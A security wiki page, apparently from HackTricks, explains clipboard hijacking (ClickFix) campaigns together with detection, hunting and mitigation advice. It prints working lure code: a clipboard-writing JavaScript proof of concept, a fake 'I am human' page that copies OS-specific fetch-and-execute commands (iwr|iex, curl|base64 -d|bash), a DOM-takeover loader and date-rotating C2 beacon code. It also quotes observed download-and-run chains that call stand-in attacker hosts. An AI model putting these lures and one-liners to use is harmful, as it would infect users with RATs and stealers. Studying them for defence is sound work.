# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User visits a typosquatted or compromised site (e.g. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript calls an `unsecuredCopyToClipboard()` helper that silently stores a Base64-encoded PowerShell one-liner in the clipboard.
3. HTML instructions tell the victim to: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` executes, downloading an archive that contains a legitimate executable plus a malicious DLL (classic DLL sideloading).
5. The loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimate Java WebStart) searches its directory for `msvcp140.dll`.
* The malicious DLL dynamically resolves APIs with **GetProcAddress**, downloads two binaries (`data_3.bin`, `data_4.bin`) via **curl.exe**, decrypts them using a rolling XOR key `"https://google.com/"`, injects the final shellcode and unzips **client32.exe** (NetSupport RAT) to `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Downloads `la.txt` with **curl.exe**
2. Executes the JScript downloader inside **cscript.exe**
3. Fetches an MSI payload → drops `libcef.dll` besides a signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Some ClickFix campaigns skip file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Example observed chain:

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Key traits
- Obfuscated URL reversed at runtime to defeat casual inspection.
- JavaScript persists itself via a Startup LNK (WScript/CScript), and selects the C2 by current day – enabling rapid domain rotation.

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS persistence of the initial run
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the terminal closes, reducing visible artifacts.

In-place page takeover on compromised sites
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}